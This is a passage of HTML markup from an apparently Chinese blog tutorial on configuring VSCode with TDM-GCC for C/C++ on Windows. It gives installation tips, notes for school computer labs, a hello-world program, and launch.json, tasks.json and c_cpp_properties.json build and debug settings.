href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h3><ol>\n<li>安装 gcc 时<strong>取消勾选</strong> <code>Check for updated files on the TDM-GCC server</code>。</li>\n<li>安装 VSCode 时在附加任务中“其他”中的<strong>四项全部勾选</strong>，即将用 Code 打开加入文件和文件夹添加入右键菜单中，并注册为受支持的文件类型的编辑器。</li>\n<li>不推荐更改<strong>默认文件夹</strong>（别抠这点空间了）。</li>\n</ol>\n<h3 id=\"普通配置\"><a href=\"#普通配置\" class=\"headerlink\" title=\"普通配置\"></a>普通配置</h3><p>安装好 VSCode 和 gcc 后，<strong>重启电脑</strong>，运行 VSCodeCppHelper ，如果你对在哪创建文件夹没有好的选择，就把 VSCodeCppHelper 放 C 盘随便一个地方里运行，然后傻瓜式 <code>enter</code> 。</p>\n<h3 id=\"机房里配置\"><a href=\"#机房里配置\" class=\"headerlink\" title=\"机房里配置\"></a>机房里配置</h3><blockquote>\n<p>由于 GZTime 学长写的 VSCodeCppHelper 小工具需要重启才能识别出 VSCode 和 gcc 的安装，但是机房的电脑一重启所有东西又会全部重置，此时便只能手动配置了。（以下均为转载）<br><em>更新：如今 VSCodeCppHelper 已经支持在没检测到环境变量的情况下进行配置了。</em></p>\n</blockquote>\n<ol>\n<li><p>打开 VSCode 至你的文件夹（此处以 <code>C:\\Coding</code> 为例）。</p>\n</li>\n<li><p>打开左侧 <code>Extensions</code> 选项卡，搜索 C++ 并安装 <code>C/C++</code> 和 <code>C/C++ Intellisence</code> 两个扩展。</p>\n</li>\n<li><p>在根目录新建文件夹 <code>Scripts</code> 以及 <code>Debug</code></p>\n</li>\n<li><p>在 <code>Scripts</code> 文件夹中新建文件 helloworld.cpp ，写下传统的 helloworld 程序：</p>\n <figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  cout &lt;&lt; <span class=\"string\">&quot;Hello world!&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n<li><p>单击左侧菜单中的运行并点击运行和调试，选择 <strong>C++(GDB/LLDB)</strong> 。</p>\n</li>\n<li><p>此时 VSCode 会在你的根目录下新建 <code>.vscode</code> 文件夹，此文件夹中用于存放 VSCode 的相关配置文件，打开 <code>launch.json</code> 替换或修改为如下内容：</p>\n <figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"comment\">// 使用 IntelliSense 了解相关属性。</span></span><br><span class=\"line\">  <span class=\"comment\">// 悬停以查看现有属性的描述。</span></span><br><span class=\"line\">  <span class=\"comment\">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;version&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;0.2.0&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;configurations&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;C++ Run&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cppdbg&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;request&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;launch&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;program&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;$&#123;workspaceRoot&#125;/Debug/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">//运行文件的路径</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;args&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;stopAtEntry&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;cwd&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;environment&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;console&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;internalConsole&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;internalConsoleOptions&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;neverOpen&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;MIMode&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;gdb&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;miDebuggerPath&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;C:/TDM-GCC-64/gdb64/bin/gdb.exe&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;setupCommands&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;description&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;为 gdb 启用整齐打印&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;text&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;-enable-pretty-printing&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;ignoreFailures&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;preLaunchTask&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Compile&quot;</span> <span class=\"comment\">//运行前需要完成的任务</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;C Run&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cppdbg&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;request&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;launch&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;program&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;$&#123;workspaceRoot&#125;/Debug/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">//运行文件的路径</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;args&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;stopAtEntry&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;cwd&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;environment&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;console&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;internalConsole&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;internalConsoleOptions&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;neverOpen&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;MIMode&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;gdb&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;miDebuggerPath&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;C:/TDM-GCC-64/gdb64/bin/gdb.exe&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;setupCommands&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;description&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;为 gdb 启用整齐打印&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;text&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;-enable-pretty-printing&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;ignoreFailures&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;preLaunchTask&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Compile_C&quot;</span> <span class=\"comment\">//运行前需要完成的任务</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">  <span class=\"punctuation\">]</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure></li>\n<li><p>在 <code>.vscode</code> 文件夹中新建文件 <code>tasks.json</code> 并输入如下内容：</p>\n <figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;version&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;2.0.0&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;tasks&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;label&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Compile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;command&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;g++&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;args&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-g&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;$&#123;file&#125;&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">//指定编译源代码文件</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-o&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;$&#123;workspaceRoot&#125;\\\\Debug\\\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 指定输出文件名，不加该参数则默认输出a.exe</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-ggdb3&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 生成和调试有关的信息</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-Wall&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 开启额外警告</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-static-libgcc&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 静态链接</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-std=c++2a&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-Wno-format&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-finput-charset=UTF-8&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">//输入编译器文本编码 默认为UTF-8</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-fexec-charset=UTF-8&quot;</span> <span class=\"comment\">//编译器输出文本编码 自行选择</span></span><br><span class=\"line\">      <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;shell&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"attr\">&quot;presentation&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;echo&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;reveal&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;silent&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 在“终端”中显示编译信息的策略，可以为always，silent，never</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;focus&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;panel&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;shared&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 不同的文件的编译信息共享一个终端面板</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;clear&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;showReuseMessage&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"attr\">&quot;problemMatcher&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;owner&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cpp&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;fileLocation&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"string\">&quot;relative&quot;</span><span class=\"punctuation\">,</span> <span class=\"string\">&quot;\\\\&quot;</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;pattern&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;regexp&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;file&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;line&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;column&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;severity&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">4</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;message&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">5</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;label&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Compile_C&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;command&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;gcc&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;args&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-g&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;$&#123;file&#125;&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">//指定编译源代码文件</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-o&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;$&#123;workspaceRoot&#125;\\\\Debug\\\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 指定输出文件名，不加该参数则默认输出a.exe</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-ggdb3&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 生成和调试有关的信息</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-Wall&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 开启额外警告</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-static-libgcc&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 静态链接</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-Wno-format&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-finput-charset=UTF-8&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">//输入编译器文本编码 默认为UTF-8</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-fexec-charset=UTF-8&quot;</span> <span class=\"comment\">//编译器输出文本编码 自行选择</span></span><br><span class=\"line\">      <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;shell&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"attr\">&quot;presentation&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;echo&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;reveal&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;silent&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 在“终端”中显示编译信息的策略，可以为always，silent，never</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;focus&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;panel&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;shared&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 不同的文件的编译信息共享一个终端面板</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;clear&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;showReuseMessage&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"attr\">&quot;problemMatcher&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;owner&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cpp&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;fileLocation&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"string\">&quot;relative&quot;</span><span class=\"punctuation\">,</span> <span class=\"string\">&quot;\\\\&quot;</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;pattern&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;regexp&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;file&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;line&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;column&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;severity&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">4</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;message&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">5</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">  <span class=\"punctuation\">]</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure></li>\n<li><p>类似的，配置 <code>c_cpp_properties.json</code> ，这个我不知道要不要（逃</p>\n <figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;configurations&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Win32&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;includePath&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">        <span class=\"string\">&quot;$&#123;workspaceFolder&#125;/**&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;defines&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">        <span class=\"string\">&quot;_DEBUG&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;UNICODE&quot;</span><span 